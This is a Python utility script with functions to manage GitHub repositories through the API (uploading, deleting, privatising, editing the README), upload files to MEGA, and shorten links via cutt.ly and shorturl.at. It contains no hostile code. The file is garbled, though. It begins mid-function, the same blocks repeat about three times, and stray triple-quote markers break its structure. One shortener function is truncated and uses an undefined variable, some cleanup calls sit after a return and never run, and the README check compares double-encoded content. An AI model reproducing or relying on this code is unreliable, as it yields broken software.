    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''

# --- colors

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
gg = "\033[1;32m"
y = r
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

